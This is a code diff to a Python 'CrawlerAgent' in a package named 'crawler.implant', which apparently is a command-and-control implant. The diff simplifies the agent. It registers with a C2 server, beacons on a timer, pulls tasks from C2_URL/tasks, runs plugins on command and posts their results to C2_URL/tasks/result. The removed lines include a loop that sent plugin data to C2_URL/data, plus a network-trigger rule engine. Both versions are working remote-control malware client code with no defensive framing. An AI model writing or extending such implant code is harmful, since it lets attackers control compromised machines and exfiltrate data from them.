@@ -69,57 +69,44 @@ class CrawlerAgent:
     def _load_plugins(self):
         self.loaded_plugins.clear()
         plugins_package = 'crawler.implant.plugins'
-        plugins_path = os.path.join("crawler", "implant", "plugins")
+        plugins_path = os.path.join(os.path.dirname(__file__), "plugins")
+
         for _, name, _ in pkgutil.iter_modules([plugins_path]):
-            if name not in ["base_plugin", "update"]:
+            if name not in ["base_plugin"]:
                 try:
-                    importlib.invalidate_caches()
-                    module = importlib.import_module(f"{plugins_package}.{name}")
-                    importlib.reload(module)
-                    for item_name in dir(module):
-                        item = getattr(module, item_name)
-                        if isinstance(item, type) and issubclass(item, BasePlugin) and item is not BasePlugin:
-                            self.loaded_plugins[instance.get_name()] = item()
-                except Exception: pass
+                    module = importlib.import_module(f".{name}", package=plugins_package)
+                    if hasattr(module, 'load'):
+                        plugin_instance = module.load()
+                        self.loaded_plugins[name] = plugin_instance
+                        print(f"Loaded plugin: {name}")
+                except Exception as e:
+                    print(f"Failed to load plugin {name}: {e}")
 
     def _execute_rule_engine(self):
-        for rule in self.rules:
-            if not rule.get("enabled", False): continue
-            trigger = rule.get("trigger", {})
-            if trigger.get("type") == "network_connection":
-                if self._check_network_trigger(trigger.get("port"), trigger.get("status")):
-                    action = rule.get("action")
-                    print(f"Rule '{rule.get('rule_name')}' triggered. Queuing action: {action}")
-                    self.tasks_to_run.append(action)
+        pass # Rule engine disabled for this simplified agent
 
     def _check_network_trigger(self, port: int, status: str) -> bool:
-        if not port or not status: return False
-        try:
-            for conn in psutil.net_connections():
-                if conn.status == status and conn.laddr and conn.laddr.port == port:
-                    return True
-        except Exception: pass
-        return False
+        return False # Rule engine disabled
 
     def _handle_task(self, task: Dict):
         command = task.get('command')
         args = task.get('args', {})
+        task_id = task.get('id')
         plugin_name = args.get('plugin_name')
 
-        if command == "reload_plugins":
-            self._load_plugins()
-        elif command == "start_plugin" and plugin_name in self.loaded_plugins and plugin_name not in self.running_plugins:
-            plugin = self.loaded_plugins[plugin_name]
-            self.running_plugins[plugin_name] = plugin
-            thread = threading.Thread(target=plugin.start, args=(self, args))
-            thread.daemon = True
-            thread.start()
-        elif command == "stop_plugin" and plugin_name in self.running_plugins:
-            self.running_plugins[plugin_name].stop()
-            del self.running_plugins[plugin_name]
+        if command == "start_plugin" and plugin_name in self.loaded_plugins:
+            try:
+                plugin_instance = self.loaded_plugins[plugin_name]
+                result = plugin_instance.run()
+
+                if task_id and result is not None:
+                    headers = {"Authorization": f"Bearer {self.token}"}
+                    payload = {"task_id": task_id, "result": json.dumps(result)}
+                    requests.post(f"{self.C2_URL}/tasks/result", json=payload, headers=headers, timeout=5)
+            except Exception as e:
+                print(f"Error running plugin {plugin_name} for task {task_id}: {e}")
+
         elif command == "terminate":
-            for plugin in self.running_plugins.values():
-                plugin.stop()
             self.is_running = False
 
     def run(self):
@@ -127,30 +114,26 @@ class CrawlerAgent:
             if not self._register_with_c2():
                 self.is_running = False
                 return
-        from .plugins.update import UpdatePlugin
-        self.loaded_plugins['update'] = UpdatePlugin()
+
         while self.is_running:
             try:
-                self._execute_rule_engine()
-                for task in self.tasks_to_run:
-                    self._handle_task(task)
-                self.tasks_to_run.clear()
                 headers = {"Authorization": f"Bearer {self.token}"}
                 response = requests.get(f"{self.C2_URL}/tasks", headers=headers, timeout=5)
-                if response.status_code == 401:
+
+                if response.status_code == 401: # Token expired or invalid
                     if not self._register_with_c2():
                         time.sleep(self.BEACON_INTERVAL_SECONDS * 2)
                         continue
+
                 response.raise_for_status()
                 c2_tasks = response.json().get('tasks', [])
+
                 for task in c2_tasks:
                     self._handle_task(task)
-                for name, instance in list(self.running_plugins.items()):
-                    data = instance.get_data()
-                    if data:
-                        payload = {"plugin": name, "data": json.dumps(data)}
-                        requests.post(f"{self.C2_URL}/data", json=payload, headers=headers, timeout=5)
-            except requests.exceptions.RequestException: pass
+
+            except requests.exceptions.RequestException as e:
+                print(f"C2 communication error: {e}")
+
             time.sleep(self.BEACON_INTERVAL_SECONDS)
 
 if __name__ == "__main__":
